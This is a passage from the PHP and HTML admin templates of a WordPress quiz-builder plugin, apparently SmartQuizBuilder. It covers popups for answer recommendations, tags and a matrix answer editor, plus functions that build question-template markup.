			</div>
			
			
		
			<div class="custom_fields_msg sucess_message" style="display:none;">Saved successfully.</div>
			<div class="sqb-question-dropdown-save justify-content-center">
				<a href="javascript:void(0)" class="quiz--btn sqb_save_question_dropdown"> Save </a>
			</div>
		</div>
	</div>
</div>

<!-- answer_dropdown_options_wrapper html end -->

<!-- answer_recommendation_options_wrapper html start -->
<div class="Manage_Side_Popup  answer_recommendation_options_wrapper" style="display:none">
   <div class="Manage_Side_Popup-inner">
      <a href="#" class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></a>
      <h2> Answer Recommendation Customizer </h2>
      <div class="Manage_Side_Popup_content">
      		<div class="d-inline-block w-100 pl-4 pr-4 cr_popup_outer_elements">
				<div class="sqb-recommendationInfo mt-2">
					<div class="sqb-recommendationQuizTitle cr_question_title"><strong>Question Title:</strong> Enter Your Question Here</div>
					<div class="sqb-recommendationQuizTitle cr_answer_choice mt-3"><strong>Answer Choice:</strong> Single</div>
					<div class="border-bottom"></div>
					<div class="sqb-recommendationQuizTitle mt-3 mb-0"><strong>Recommendation Screen 
					<div class="tool-tip">
						<i class="fa fa-info-circle" aria-hidden="true"></i>
						<div class="toll-tip-desc" style="max-width:350px;">When users select an answer, if content recommendation screen is enabled for that answer, SQB will display that and then the users can go to the next question.</div>
						</div></strong></div>
				</div>	
				<div class="recommendationInfoSection">
					<div class="popup_saved_data_msg mb-2">Recommendation Screen is inserted between questions. You can display different recommendations based on the selected answers.</div>
				</div>
				<div class="d-inline-block w-100 mt-0">
					<div class="recommendation-delete--btn"><i class="fa fa-trash-o" aria-hidden="true" title=""></i></div>
					<div class="answer_recommendation_popup_html_wrapper">
					</div>
				</div>
				
				<div class="mt-4 sqb-recommendationOptions enable_disable_reccomendation">
	      			<div class="d-flex align-items-center">
						<label>Enable Recommendation</label>
						<div class="square-switch_onoff ml-3">
							<input class="checkbox" name="showHide_video" type="checkbox" id="recommendation-switch" value="">
							<label for="recommendation-switch"></label>
						</div>
					</div>
				</div>
			</div>
			<div class="cr_success_msg mt-4 pl-4 pr-4" style="display:none;">
				<div class="popup_saved_data_msg m-0">Saved Successfully</div>
			</div>
			<div class="cr_delete_msg mt-4 pl-4 pr-4" style="display:none;">
				<div class="popup_saved_data_msg m-0">Deleted Successfully</div>
			</div>
			
			<div class="sqb-popup-bottom-actions justify-content-between">
			 	<button class="save-popup-bottom cancel">Cancel</button>
			 	<button class="save-popup-bottom popup_answer_recommendation_save_btn">Save</button>
			 	<button class="save-popup-bottom popup_answer_recommendation_save_btn save_and_close">Save & Close</button>
			 	<button class="save-popup-bottom close_cr_popup_button" style="display:none;margin:0 auto;" >Close</button>
			 </div>
			
      </div>
    </div>
</div>
<!-- answer_recommendation_options_wrapper html start -->

<!-- answer_tags html start -->

<div class="Manage_Side_Popup answer_tags_wrapper" style="display:none;">
	<div class="Manage_Side_Popup-inner">
		<a href="#" class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></a>
		<h2>Customizer</h2>
		<div class="Manage_Side_Popup_content">
			<input type="hidden" value="" class="ans_id_in_tag">
			<div class="d-inline-block w-100 pl-4 pr-4 cr_popup_outer_elements">
				<!-- <div class="list-available-tags">
					<h5 class="quiz--sub-title">Available Tags: </h5>
					<label class="quiz_label">Tag 1, Tag 2 </label>
				</div> -->
				
				<div class="d-inline-block w-100 mb-2">
					<div class="d-block 
					cr_question_title"><strong>Answer Title:</strong> q1</div>					
					<div class="border-bottom"></div>					
				</div>
				
				<div class="custom_fields_table_tag">
					<div class="d-flex w-100 mb-3 justify-content-between align-items-center">
						<h5 class="quiz--sub-title mb-0 border-bottom-0">Currently Assigned Tags</h5>
						<span class="add-tag-content"><i class="fa fa-plus" aria-hidden="true"></i> Create New Tag</span>
					</div>
					<div class="ans_listing_table">
						<table class="table table-striped scrolldown ad_table mb-0">
							<thead>
								<tr>
									<!-- <th></th>	 -->									 
									<th>Tag Name</th>
									<th width="100px">Action</th>
								</tr>
							</thead>
							<tbody class="ad_tbody show_ans_tags">
								
							</tbody>
						</table>
					</div>
				</div>
				<div class="add_tag_form" style="display:none;"> 
					<h5 class="quiz--sub-title mt-3 mb-0">Add a New Tag<div 
					class="tool-tip" 
					style="margin-left:10px;color:#444;"><i class="fa 
					fa-info-circle" aria-hidden="true"></i><div 
					class="toll-tip-desc" style="width:400px;">
						<label for="" class="quiz_label">If you want to display additional tag-based content on the outcome screen, follow these steps.</label>
						<label for="" class="quiz_label"><strong class="w-100 d-inline-block">Step 1: </strong> Go to the SQB Settings >> <a href="../wp-admin/admin.php?page=sqb_settings&inner_tab=tags_tab" target="_blank">Tags</a>  page and enter Tag Description / Message.</label>
						<label for="" class="quiz_label"><strong class="w-100 d-inline-block">Step 2: </strong> Add this shortcode on your outcome screen. [SHOWTAGCONTENT Name="Tag Name"] </label>
						<label for="" class="quiz_label">If users get this tag, then SQB will display the tag message on the outcome screen.</label>
					</div></div>
					
					</h5>
					<div class="quiz-content-card ">
						<label for="" class="quiz_label">Enter Tag Name</label>
						<div class="quiz_right-content">
							<input type="text" name="tag_name" id="tag_name" value="">
							<button class="save-popup-bottom save-ans-tags">Save Tag</button>
						</div>
					</div>
					 
					 <div class="or-divider"><span>OR</span></div>
				 </div>
				 
				 <div class="existing-div-show-hide mt-3" style="display:none;">
				 	<h5 class="quiz--sub-title">Select from Existing Tags</h5>
					<div class="quiz_right-content">
						<div id="all_tag_data_outer" class="mutliSelect p-0">
							<ul class="all_tag_data form-control m-0">
								
							</ul> 
						</div>								
					</div>
				 </div>
				 
				<div class="sqb_comment_note_outer mt-4">
					<div class="sqb_comment_note_inner">
					<strong>Please note: </strong> If you want to display tag-specific details on the outcome screen:</br>
					<strong>Step 1.</strong> Add tag description in the <a href="../wp-admin/admin.php?page=sqb_settings&inner_tab=tags_tab" target="_blank">settings</a> page. </br>
					<strong>Step 2.</strong> Then add [SHOWALLUSERTAGS] on the final outcome screen to display tag description.</br>
					</div>
				</div>
				 
				<div class="sqb-popup-bottom-actions justify-content-center">
					<button class="save-popup-bottom popup_answer_tags_save_btn">Save</button>
				</div> 
				 
			</div>
		</div>
	</div>
</div>

<!--  -->
<!-- answer_matrix_options_wrapper html start -->
<div class="Manage_Side_Popup active_Side_Popup answer_matrix_options_wrapper" style="display:none">
   <div class="Manage_Side_Popup-inner">
      <a href="#" class="close_Side_Popup close_matrix_answer_type_side_popup"><i class="fa fa-times" aria-hidden="true"></i></a>
      <h2> Add/Edit Answer  </h2>
      
      <div class="Manage_Side_Popup_content">
		  <h3 class="matrix-question-title"> Enter Your Question Here</h3>
      	<div class="matrix-top-actions">
      		<div class="matrix-top-left">
				<button class="add_answer_matrix"><i class="fa fa-plus" aria-hidden="true"></i>Add Answer</button>
				<button class="add_option_matrix"><i class="fa fa-plus" aria-hidden="true"></i>Add Option</button>
				<button class="add-matrix-tags">Add Tags</button>
			 
				<div class="checkbox-custom-style">
					<input type="checkbox" class="custom-checkbox-input add_value_matrix">
					<span class="custom--checkbox"></span>
				</div>
				<span><strong>Add Value</strong></span>

				<label>Left Column Width <br><span style="font-weight:normal;">(in %)</span></label>
				<input type="number" name="matrix_column_width">	

				<?php 

				$matrix_background_color = '#f5f5f5';
				$radio_button_border_color = '#d6d6d6';
				$radio_button_color = '#55c57a';

				$screen_name = 'matrix_background_color';
				$strm_type = 'matrix';
				if(isset($_GET['id'])){ 
					$theme_data_has = SQB_GlobalTheme::loadByQuizIdAndNameAndType($_GET['id'],$screen_name,$strm_type);
					
					if(isset($theme_data_has) && !empty($theme_data_has)) {
						$matrix_background_data = maybe_unserialize($theme_data_has->getValue()); 
						
						if(!empty($matrix_background_data["matrix_background_color"])){
							$matrix_background_color = $matrix_background_data["matrix_background_color"];
						}
						if(!empty($matrix_background_data["radio_button_border_color"])){
							$radio_button_border_color = $matrix_background_data["radio_button_border_color"];
						}
						if(!empty($matrix_background_data["radio_button_color"])){
							$radio_button_color = $matrix_background_data["radio_button_color"];
						}
					}
				}

				?>


				<div class="matrix-background-color-outer">
					<div class="matrix-background-color-inner">
						<h4>Matrix Background</h4>
						<div class="input-group colorpicker-component input-append color colorpicker-element" id="matrix_background_color_div">
							<input type="text" value="<?php echo $matrix_background_color; ?>" id="matrix_background_color" >
							<span class="input-group-addon">
								<i style="background-color: <?php echo $matrix_background_color; ?>">
								</i>
							</span>
						</div>
					</div>
					<div class="matrix-background-color-inner">
						<h4>Radio Button Color</h4>
						<div class="input-group colorpicker-component input-append color colorpicker-element" id="radio_button_color_div">
							<input type="text" value="<?php echo $radio_button_color ?>" id="radio_button_color" >
							<span class="input-group-addon">
								<i style="background-color: <?php echo $radio_button_color ?>">
								</i>
							</span>
						</div>
					</div>
					<div class="matrix-background-color-inner">
						<h4>Radio Button Border</h4>
						<div class="input-group colorpicker-component input-append color colorpicker-element" id="radio_button_border_color_div">
							<input type="text" value="<?php echo $radio_button_border_color ?>" id="radio_button_border_color" >
							<span class="input-group-addon">
								<i style="background-color: <?php echo $radio_button_border_color ?>">
								</i>
							</span>
						</div>
					</div>
		        </div>
			</div>
			
		</div>
              <div id="sqb-answer-matrix-table-scroll" class="sqb-answer-matrix-table-scroll">
				 
				<div class="SQB-table-wrap">
				  
				</div>
			  </div>
			  
		  	<div class="matrix-outcome-mapping">
				
			</div>

			
			<div class="matrix-bottom-actions">
				<button class="save_matrix_answer">Save</button>
			</div>
        </div>
   </div>
</div>
<div class="answer_matrix_default_data">
	<table class="SQB-main-table">
					<thead>
					  <tr>
						<th class="SQB-fixed-side" scope="col">&nbsp;</th>
						<th scope="col" width="150px"><div class="matrix_label_text"><div class="sqb_tiny_mce_editor_disabled">Extremely satisfied</div></div><div class="sqb-matrix-col-remove"><i class="fa fa-close" aria-hidden="true"></i></div></th>
						<th scope="col" width="150px"><div class="matrix_label_text"><div class="sqb_tiny_mce_editor_disabled">Somewhat satisfied</div></div><div class="sqb-matrix-col-remove"><i class="fa fa-close" aria-hidden="true"></i></div></th>
						<th scope="col" width="150px"><div class="matrix_label_text"><div class="sqb_tiny_mce_editor_disabled">Neither satisfied nor dissatisfied</div></div><div class="sqb-matrix-col-remove"><i class="fa fa-close" aria-hidden="true"></i></div></th>
						<th scope="col" width="150px"><div class="matrix_label_text"><div class="sqb_tiny_mce_editor_disabled">Somewhat dissatisfied</div></div><div class="sqb-matrix-col-remove"><i class="fa fa-close" aria-hidden="true"></i></div></th>
						<th scope="col" width="150px"><div class="matrix_label_text"><div class="sqb_tiny_mce_editor_disabled">Extremely dissatisfied</div></div><div class="sqb-matrix-col-remove"><i class="fa fa-close" aria-hidden="true"></i></div></th>
						
						<th scope="col"></th>
						
					  </tr>
					</thead>
					<tbody>
					  <?php $naswer_round_no_1 = date('Y_m_d_h_i_s').'_'.rand(10,1000).'_'.rand(10,1000); ?>
					  <tr class="sqb_ans_item" data-id="%%ANSWERID%%" id="%%sqb_random_number%%">
						<th class="SQB-fixed-side"><div class="sql_ans_text sqb_tiny_mce_editor_disabled"> Type Answer Here</div></th>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><span class="sqb-matrix-delete-row sqb_backend_show sqb_remove_section sqb_ans_delete_btn" data-id ="%%sqb_random_number%%"><i class="fa fa-trash-o" aria-hidden="true"></i></span></td>
					  </tr>
					  <?php $naswer_round_no_1 = date('Y_m_d_h_i_s').'_'.rand(10,1000).'_'.rand(10,1000); ?>
					  <tr class="sqb_ans_item" data-id="%%ANSWERID%%" id="%%sqb_random_number%%">
						<th class="SQB-fixed-side"><div class="sql_ans_text sqb_tiny_mce_editor_disabled"> Type Answer Here</div></th>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><span class="sqb-matrix-delete-row sqb_backend_show sqb_remove_section sqb_ans_delete_btn" data-id ="%%sqb_random_number%%"><i class="fa fa-trash-o" aria-hidden="true"></i></span></td>
					  </tr>
					  <?php $naswer_round_no_1 = date('Y_m_d_h_i_s').'_'.rand(10,1000).'_'.rand(10,1000); ?>
					  <tr class="sqb_ans_item" data-id="%%ANSWERID%%" id="%%sqb_random_number%%">
						<th class="SQB-fixed-side"><div class="sql_ans_text sqb_tiny_mce_editor_disabled"> Type Answer Here</div></th>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><span class="sqb-matrix-delete-row sqb_backend_show sqb_remove_section sqb_ans_delete_btn" data-id ="%%sqb_random_number%%"><i class="fa fa-trash-o" aria-hidden="true"></i></span></td>
					  </tr>
					  <?php $naswer_round_no_1 = date('Y_m_d_h_i_s').'_'.rand(10,1000).'_'.rand(10,1000); ?>
					  <tr class="sqb_ans_item" data-id="%%ANSWERID%%" id="%%sqb_random_number%%">
						<th class="SQB-fixed-side"><div class="sql_ans_text sqb_tiny_mce_editor_disabled"> Type Answer Here</div></th>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><span class="sqb-matrix-delete-row sqb_backend_show sqb_remove_section sqb_ans_delete_btn" data-id ="%%sqb_random_number%%"><i class="fa fa-trash-o" aria-hidden="true"></i></span></td>
					  </tr>
					  <?php $naswer_round_no_1 = date('Y_m_d_h_i_s').'_'.rand(10,1000).'_'.rand(10,1000); ?>
					  <tr class="sqb_ans_item" data-id="%%ANSWERID%%" id="%%sqb_random_number%%">
						<th class="SQB-fixed-side"><div class="sql_ans_text sqb_tiny_mce_editor_disabled"> Type Answer Here</div></th>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><input type="radio" ><input type="text" value="0" style="display:none" class="answer_value"></td>
						<td><span class="sqb-matrix-delete-row sqb_backend_show sqb_remove_section sqb_ans_delete_btn" data-id ="%%sqb_random_number%%"><i class="fa fa-trash-o" aria-hidden="true"></i></span></td>
					  </tr>
					  
					</tbody>
				  </table>

</div>
<!-- answer_matrix_options_wrapper html end -->
<?php 

if(isset($quiz_data) && isset($_GET['id'])){
	$questin_quiz_temlate_obj = SQB_QuizTemplate::checkByQuizIdHas($_GET['id']);
	if($questin_quiz_temlate_obj){
		echo "<div class='quiz_question_answer_template_html' style='display:none'>".urldecode($questin_quiz_temlate_obj->getQuizQuestionAnswerTemplateHtml())."</div>";
	}
}

function sqbAddMoreQuestionsTemplate5(){
	$img_url = plugins_url('').'/smartquizbuilder/includes/images/sqb_quiz.png';
	$quiz_category_list = sqbGetQuizCategoryListHtmlOfQuestionScreen();
	$html  = '
			<div class="question_div_outer" id="%%CURRENTDATETIMEMAINDIV%%">
				
				<input type="hidden" name="question_temp_name" value="standard">
				<input type="hidden" name="question_temp_no" value="template1">
				<input type="hidden" name="question_file_upload_settings" value="">
				<input type="hidden" name="enable_question_background_image" value="N">
				<input type="hidden" name="question_background_image" value="">
				<input type="hidden" name="progress_bar_color" value="#000">
				<div class="question_div_inner"  style=" position: relative;">
					
								
					<div class="Quiz-Template Quiz-Template-5 quiz_comon_template sqb_question_enable_drag_drop" data-id="%%SQBQUESTIONID%%">
						<div class="Quiz-Template5-inner">
							<div class="Quiz-Template5-left-side">
							  <div class="question_details">
							  	
								<div class="sqb_question_drag_drop_item question_title sqb_tiny_mce_editor_rename Quiz-Template-title"><div>Enter Your Question Here</div></div>
		                       </div> 
		                    </div>

	                       <div class="Quiz-Template5-right-side">
	                       		<div class="Quiz-Template5-right-inner">
	                       		 <div class="question_drop_down_wrapper">
								    <div class="quiz-content-card question-type-card question_type_wrapper " style="display:none">
										<label  class="quiz_label">Question  Type</label>
										<div class="dropdown dropdown-custom-style">
											<!--<button class="dropdown-toggle" type="button" data-toggle="dropdown" data-value="multi">Multiple Choice
											<span class="caret"></span></button>-->
											<button class="dropdown-toggle" type="button"  data-value="single"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/single-choice.svg"><span>Single Choice</span></button>
											<ul class="dropdown-menu question_type_list_ul">
												<li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/single-choice.svg"><a href="javascript:void(0)" value="single" >Single Choice</a></li>
												<li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/multiple-choice.svg"><a href="javascript:void(0)" value="multi" >Multiple Choice</a></li>
												<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/yes-no.svg"><a href="javascript:void(0)" value="yes_no" >Yes/No</a></li>
												<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/text.svg"><a href="javascript:void(0)" value="text" >Text</a></li>
												<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/numerical-value.svg"><a href="javascript:void(0)" value="numerical_text" >Numerical Value</a></li>
												<li class="showHideQueTypeOption_assessment_scoring"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/rating.svg"><a href="javascript:void(0)" value="rating" >Rating Scale</a></li>
												<li class="showHideQueTypeOption"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/fill-in-blank.svg"><a href="javascript:void(0)" value="fill_in_blank" >Fill In Blank</a></li>
												<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/file-upload.svg"><a href="javascript:void(0)" value="file_upload" >File Upload</a></li>
												<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/slider.svg"><a href="javascript:void(0)" value="slider" >Slider</a></li>
												<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/matrix.svg"><a href="javascript:void(0)" value="matrix" class="showQueTypeOption_assessment_scorings"  >Matrix</a></li>
												<li class="showHideQueTypeOption_assessment_scoring"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/ranking-choice.svg"><a href="javascript:void(0)" value="ranking_choices">Ranking / Choice</a></li>
												<li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/date.svg"><a href="javascript:void(0)" value="date" >Date</a></li>
												<li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/dropdown.svg"><a href="javascript:void(0)" value="dropdown" >Dropdown</a></li>
												<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/complete-the-sentence.svg"><a href="javascript:void(0)" value="matching_text" >Complete the Sentences</a></li>
                                                <li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/email.svg"><a href="javascript:void(0)" value="email" >Email</a></li>
												<li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/phone-number.svg"><a href="javascript:void(0)" value="phone_number" >Phone Number</a></li>
												<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/height.png"><a href="javascript:void(0)" value="weight_and_height" >Weight and Height</a></li>
												<li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/name.png"><a href="javascript:void(0)" value="name" >Name</a></li>
											</ul>
										</div>
								        <div class="add_more_rating_btn" style="display:none">Add More Ratings</div>
								        <div class="dropdown-link-style dropdown">
											<button class="dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> <span> ...</span></button>
											<div class="dropdown-menu" aria-labelledby="dropdownMenuButton" x-placement="bottom-start" style="position: absolute; will-change: transform; top: 0px; left: 0px; transform: translate3d(17px, 30px, 0px);">
												<a class="dropdown-item" href="#">
													<div class="checkbox-custom-style">
														<input type="checkbox" class="custom-checkbox-input" name="allow_skip_ques">
															<span class="custom--checkbox"></span>
														</div> Allow students to skip questions
												</a><div class="sqb_ans_multiple" style="display:none;"><div class="multile-ans-section">
																		<div class="sqb-multiple-ans-optionsd" style="">
																			<div class="sqb-multiple-ans-on-off">
																				<div class="checkbox-custom-style">
																					<input type="checkbox" class="custom-checkbox-input" name="sqb_multiple_ans_limited">
																					<span class="custom--checkbox"></span>
																				</div> 
																				<label>Max allowed answers:</label>
																			</div>
																			<div class="sqb-que-limit">
																				<label for="sqb_multiple_ans_input_limit">Limit to <div class="tool-tip">
																								<i class="fa fa-info-circle" aria-hidden="true"></i>
																								<div class="toll-tip-desc">Limit the number of answers that users can pick
																								</div></div></label>
																				<input type="number" min="1" name="sqb_multiple_ans_input_limit" id="sqb_multiple_ans_input_limit" placeholder="Limit" value="">
																			</div>
																			</div>
																		</div>
																	</div>		
											</div>
										</div>
									</div>
										'.$quiz_category_list.'
								</div>

								    <div class="question_rating_lable_div sqb_question_drag_drop_item rating_info" style="display:none">
										<div class="question_rating_lable_div_inner question_rating_lable_low rating_info_left">
											
											<label class="quiz_label">Low Score Label</label>
											<div class="sqb_tiny_mce_editor_rename question_rating_lable_low_text"><div>Strongly Disagree</div></div>
										</div>
										<div class="question_rating_lable_div_inner question_rating_lable_high rating_info_right">
											
											<label class="quiz_label">High Score Label</label>
											<div class="sqb_tiny_mce_editor_rename question_rating_lable_high_text"><div>Strongly Agree</div></div>
										</div>
									</div>

									<div class="question_add_answer_outer_div sqb_question_drag_drop_item ">
									</div>

									<div class="sqb_quiz_template5_next_button_outer skip_continue_button_wrapper">
									
									</div>
								</div>
								
								<div class="question_add_answer_btn_div template5_question_add_answer_btn_div sqb_question_drag_drop_item">
									<div class="question_add_more_ans_btn" style="">Add New Answer</div>
								</div>
							</div>
						</div>

						<div class="question_add_answer_btn_div sqb_question_drag_drop_item">
							<div class="question_add_more_ans_btn">Add New Answer</div>
							<div class="assessment_outcome_connect_btn  personality_outcome_connect_btn">
                               
                                <div class="outcome-options">
                                    <span class="outcome-option-connect" >Connect to Outcome </span>
                                    <span class="outcome-option-skip outcome-option-active" >Skip Mapping</span>
                                </div>
                            </div>
						</div>
						<div class="assessment_outcome_connect_wrapper" style="display:none">
						   <div class="assessment_outcome_head">
								<div class="AO_head_title">Map Answers to Outcome</div>
								
							</div>
							

							<div class="assessment_outcome_connect" >
							</div>
						</div> 


						<div class="QA-advance-option">
						<div class="quiz-content-card show_correct_inccorect_ans_checkbox_wrapper" style="display:none">
							<label for="" class="quiz_label">Do you want to display incorrect/correct answers?</label>
							<div class="quiz_right-content">
								<div class="square-switch_onoff">
									<input class="checkbox" name="show_correct_inccorect_ans_checkbox" type="checkbox" id="show_correct_inccorect_ans_checkbox_%%SQBRANDOMNO%%" value="Y"  >
									<label for="show_correct_inccorect_ans_checkbox_%%SQBRANDOMNO%%"></label>
								</div>
							</div>
						</div>


						<div class="quiz-content-card sqb_incorrect_correct_ans_wrapper" style="display:none">
								<label for="" class="quiz_label">Correct answer message</label>
								<div class="quiz_right-content">
									<textarea class="sqb_correct_ans sqb_text_tiny_mce_editor_rename"></textarea>
								</div>
						</div>
						<div class="quiz-content-card sqb_incorrect_correct_ans_wrapper" style="display:none">
								<label for="" class="quiz_label">Incorrect answer message</label>
								<div class="quiz_right-content">
									<textarea class="sqb_incorrect_ans sqb_text_tiny_mce_editor_rename"></textarea>
									
								</div>
						</div>
										

							
							
							
					</div>
					
					
					
					<div class="save_and_add_more_quesiton_btn_wrapper">
						<div class="save_question_btn" onclick="save_single_question()" >Save This Question</div>
						<div class="add_more_question_btn" onclick="sqb_add_more_question()">Add More Questions</div>
					</div>
				</div>
			</div>
		</div>';		
	return $html;
}

function sqbAddMoreQuestionsTemplate9(){
	$img_url = plugins_url('').'/smartquizbuilder/includes/images/sqb_quiz.png';
	$html  = '
			<div class="question_div_outer" id="%%CURRENTDATETIMEMAINDIV%%">
				
				<input type="hidden" name="question_temp_name" value="standard">
				<input type="hidden" name="question_temp_no" value="template1">
				<input type="hidden" name="question_file_upload_settings" value="">
				<input type="hidden" name="enable_question_background_image" value="N">
				<input type="hidden" name="question_background_image" value="">
				<input type="hidden" name="progress_bar_color" value="#000">
				<div class="question_div_inner"  style=" position: relative;">
					'.template8_top_settings_section().'
								
					<div class="Quiz-Template Quiz-Template-9 quiz_comon_template sqb_question_enable_drag_drop" data-id="%%SQBQUESTIONID%%">
						<div class="question-screen Quiz-Template9-inner sqb-template-bg-video-left template9-inner-center Quiz-Template9-column-wrapper question_screen_has_image">
							<div class="Quiz-Template9-left-side Quiz-Template9-left-column-wrapper" >

		                    </div>

	                       <div class="Quiz-Template9-right-side Quiz-Template9-right-column-wrapper">
	                       		<div class="Quiz-Template9-right-inner answer_type_single">
	                       			<div class="template9-question-div">
	                       				<div class="question_details">
											<div class="sqb_question_drag_drop_item question_title sqb_tiny_mce_editor_rename Quiz-Template-title">
												<div>Enter Your Question Here</div>
											</div>
											<div class="sqb_question_drag_drop_item Quiz-Template-content question_description sqb_tiny_mce_editor_rename">
												<div>Enter any additional information about the quiz</div>
											</div>
										</div> 
									</div>
	                       		 

								    <div class="question_rating_lable_div sqb_question_drag_drop_item rating_info" style="display:none">
										<div class="question_rating_lable_div_inner question_rating_lable_low rating_info_left">
											
											<label class="quiz_label">Low Score Label</label>
											<div class="sqb_tiny_mce_editor_rename question_rating_lable_low_text"><div>Strongly Disagree</div></div>
										</div>
										<div class="question_rating_lable_div_inner question_rating_lable_high rating_info_right">
											
											<label class="quiz_label">High Score Label</label>
											<div class="sqb_tiny_mce_editor_rename question_rating_lable_high_text"><div>Strongly Agree</div></div>
										</div>
									</div>

									<div class="question_add_answer_outer_div sqb_question_drag_drop_item ">
									</div>
									<div class="sqb_quiz_template5_next_button_outer skip_continue_button_wrapper">
									</div>
								</div>
								
								
							</div>
						</div>

						<div class="question_add_answer_btn_div sqb_question_drag_drop_item">
							<div class="question_add_more_ans_btn">Add New Answer</div>
							<div class="assessment_outcome_connect_btn  personality_outcome_connect_btn">
                               
                                <div class="outcome-options">
                                    <span class="outcome-option-connect" >Connect to Outcome </span>
                                    <span class="outcome-option-skip outcome-option-active" >Skip Mapping</span>
                                </div>
                            </div>
						</div>
						<div class="assessment_outcome_connect_wrapper" style="display:none">
						   <div class="assessment_outcome_head">
								<div class="AO_head_title">Map Answers to Outcome</div>
								
							</div>
							

							<div class="assessment_outcome_connect" >
							</div>
						</div> 


						<div class="QA-advance-option">
						<div class="quiz-content-card show_correct_inccorect_ans_checkbox_wrapper" style="display:none">
							<label for="" class="quiz_label">Do you want to display incorrect/correct answers?</label>
							<div class="quiz_right-content">
								<div class="square-switch_onoff">
									<input class="checkbox" name="show_correct_inccorect_ans_checkbox" type="checkbox" id="show_correct_inccorect_ans_checkbox_%%SQBRANDOMNO%%" value="Y"  >
									<label for="show_correct_inccorect_ans_checkbox_%%SQBRANDOMNO%%"></label>
								</div>
							</div>
						</div>


						<div class="quiz-content-card sqb_incorrect_correct_ans_wrapper" style="display:none">
								<label for="" class="quiz_label">Correct answer message</label>
								<div class="quiz_right-content">
									<textarea class="sqb_correct_ans sqb_text_tiny_mce_editor_rename"></textarea>
								</div>
						</div>
						<div class="quiz-content-card sqb_incorrect_correct_ans_wrapper" style="display:none">
								<label for="" class="quiz_label">Incorrect answer message</label>
								<div class="quiz_right-content">
									<textarea class="sqb_incorrect_ans sqb_text_tiny_mce_editor_rename"></textarea>
									
								</div>
						</div>
					</div>
					<div class="save_and_add_more_quesiton_btn_wrapper">
						<div class="save_question_btn" onclick="save_single_question()" >Save This Question</div>
						<div class="add_more_question_btn" onclick="sqb_add_more_question()">Add More Questions</div>
					</div>
				</div>
			</div>
		</div>';		
	return $html;
}

function template8_top_settings_section_edit_mode($edit,$sel_temp,$layout_value,$layout_text,$skipChecked,$ans_with_img,$options_data,$ans_image_size_custom,$ans_image_width,$ans_image_height,$ans_show_image_label,$answer_type_matrix_selected_class,$question_type_option,$tool_tip_related_style,$question_type,$question_type_text,$ques_type_rating,$ques_type_fill,$answer_type_tool_tip,$add_rating_btn_display,$quiz_category_list,$question_image,$multiple_ans_checked,$sqb_multiple_ans_input_limit){

$question_type_texts = "Single Choice";
$question_images = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/single-choice.svg">';
$question_types = "single";
$layout_texts = "4 Columns";
$layout_values = "four_column";
$image_size_option = '<option value="cover">Cover Image</option><option value="100_100" data-height="100" data-width="100">100x100</option><option value="200_200" data-height="200" data-width="200">200x200</option><option value="300_300" data-height="300" data-width="300">300x300</option><option value="custom">Custom Size</option>';
if($edit ='edit'){
$question_type_texts = $question_type_text;
$question_images = $question_image;
$question_types = $question_type;

$layout_texts = $layout_text;
$layout_values = $layout_value;
$image_size_option = $options_data;
}

$question_type_texts = $question_type_texts;
$question_images = $question_images;
$question_types = $question_types;

$layout_text = $layout_texts;
$layout_values = $layout_values;
$options_data = $image_size_option;

